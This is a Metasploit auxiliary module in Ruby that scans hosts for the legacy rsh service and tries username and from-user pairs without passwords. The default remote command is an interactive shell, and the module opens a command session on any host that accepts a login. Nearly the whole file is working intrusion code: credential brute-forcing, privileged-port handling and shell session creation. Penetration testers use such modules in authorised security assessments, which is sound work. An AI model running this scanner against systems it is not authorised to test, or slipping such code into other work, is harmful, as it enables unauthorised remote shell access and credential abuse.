##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::RServices
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::CommandShell
  include Msf::Sessions::CreateSessionOptions
  include Msf::Auxiliary::ReportSummary

  def initialize
    super(
      'Name'        => 'rsh Authentication Scanner',
      'Description' => %q{
          This module will test a shell (rsh) service on a range of machines and
        report successful logins.

        NOTE: This module requires access to bind to privileged ports (below 1024).
      },
      'References' =>
        [
          [ 'CVE', '1999-0651' ],
          [ 'CVE', '1999-0502'] # Weak password
        ],
      'Author'      => [ 'jduck' ],
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(514),
        OptBool.new('ENABLE_STDERR', [ true, 'Enables connecting the stderr port', false ])
      ])
  end

  def run_host(ip)
    print_status("#{ip}:#{rport} - Starting rsh sweep")

    cmd = datastore['CMD']
    cmd ||= 'sh -i 2>&1'

    if datastore['ENABLE_STDERR']
      # For each host, bind a privileged listening port for the target to connect
      # back to.
      ret = listen_on_privileged_port
      if not ret
        return :abort
      end
      sd, lport = ret
    else
      sd = lport = nil
    end

    # The maximum time for a host is set here.
    Timeout.timeout(300) {
      each_user_fromuser { |user, fromuser|
        do_login(user, fromuser, cmd, sd, lport)
      }
    }

    sd.close if sd
  end


  def each_user_fromuser(&block)
    # Class variables to track credential use (for threading)
    @@credentials_tried = {}
    @@credentials_skipped = {}

    credentials = extract_word_pair(datastore['USERPASS_FILE'])

    users = load_user_vars()
    credentials.each { |u,p| users << u }
    users.uniq!

    fromusers = load_fromuser_vars()

    cleanup_files()

    # We'll abuse this nice array combining function, despite its inaccurate name in this case :)
    credentials = combine_users_and_passwords(users, fromusers)

    fq_rest = "%s:%s:%s" % [datastore['RHOST'], datastore['RPORT'], "all remaining users"]

    credentials.each do |u,fu|

      break if @@credentials_skipped[fq_rest]

      fq_user = "%s:%s:%s" % [datastore['RHOST'], datastore['RPORT'], u]

      userpass_sleep_interval unless @@credentials_tried.empty?

      next if @@credentials_skipped[fq_user]
      next if @@credentials_tried[fq_user] == fu

      ret = block.call(u, fu)

      case ret
      when :abort # Skip the current host entirely.
        break

      when :next_user # This means success for that user.
        @@credentials_skipped[fq_user] = fu
        if datastore['STOP_ON_SUCCESS'] # See?
          @@credentials_skipped[fq_rest] = true
        end

      when :skip_user # Skip the user in non-success cases.
        @@credentials_skipped[fq_user] = fu

      when :connection_error # Report an error, skip this cred, but don't abort.
        vprint_error "#{datastore['RHOST']}:#{datastore['RPORT']} - Connection error, skipping '#{u}' from '#{fu}'"
      end
      @@credentials_tried[fq_user] = fu
    end
  end


  def do_login(user, luser, cmd, sfd, lport)
    vprint_status("#{target_host}:#{rport} - Attempting rsh with username '#{user}' from '#{luser}'")

    # We must connect from a privileged port.
    this_attempt ||= 0
    ret = nil
    while this_attempt <= 3 and (ret.nil? or ret == :refused)
      if this_attempt > 0
        # power of 2 back-off
        select(nil, nil, nil, 2**this_attempt)
        vprint_error "#{rhost}:#{rport} rsh - Retrying '#{user}' from '#{luser}' due to reset"
      end
      ret = connect_from_privileged_port
      break if ret == :connected
      this_attempt += 1
    end

    return :abort if ret != :connected

    sock.put("#{lport}\x00#{luser}\x00#{user}\x00#{cmd}\x00")

    if sfd and lport
      stderr_sock = sfd.accept
      add_socket(stderr_sock)
    else
      stderr_sock = nil
    end

    # NOTE: We report this here, since we are awfully convinced now that this is really
    # an rsh service.
    report_service(
      :host => rhost,
      :port => rport,
      :proto => 'tcp',
      :name => 'shell'
    )

    # Read the expected nul byte response.
    buf = sock.get_once(1) || ''
    if buf != "\x00"
      buf = sock.get_once(-1)
      if buf.nil?
        return :failed
      end
      result = buf.gsub(/[[:space:]]+/, ' ')
      vprint_error("Result: #{result}")
      return :skip_user if result =~ /locuser too long/
      return :failed
    end

    # should we report a vuln here? rsh allowed w/o password?!
    print_good("#{target_host}:#{rport}, rsh '#{user}' from '#{luser}' with no password.")
    start_rsh_session(rhost, rport, user, luser, buf, stderr_sock)

    return :next_user

  # For debugging only.
  #rescue ::Exception
  #	print_error("#{$!}")
  #	return :abort

  ensure
    disconnect()

  end


  #
  # This is only needed by RSH so it is not in the rservices mixin
  #
  def listen_on_privileged_port
    lport = 1023
    sd = nil
    while lport > 512
      #vprint_status("Trying to listen on port #{lport} ..")
      sd = nil
      begin
        sd = Rex::Socket.create_tcp_server('LocalPort' => lport)

      rescue Rex::BindFailed
        # Ignore and try again

      end

      break if sd
      lport -= 1
    end

    if not sd
      print_error("Unable to bind to listener port")
      return false
    end

    add_socket(sd)
    #print_status("Listening on port #{lport}")
    [ sd, lport ]
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def start_rsh_session(host, port, user, luser, proof, stderr_sock)
    service_data = {
      address: host,
      port: port,
      service_name: 'shell',
      proof: proof,
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: self.fullname,
      origin_type: :service,
      username: user,
      # Save a reference to the socket so we don't GC prematurely
      stderr_sock: stderr_sock
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    if datastore['CreateSession']
      start_session(self, "RSH #{user} from #{luser} (#{host}:#{port})", login_data, nil, self.sock)
      # Don't tie the life of this socket to the exploit
      self.sockets.delete(stderr_sock)
      self.sock = nil
    end
  end
end
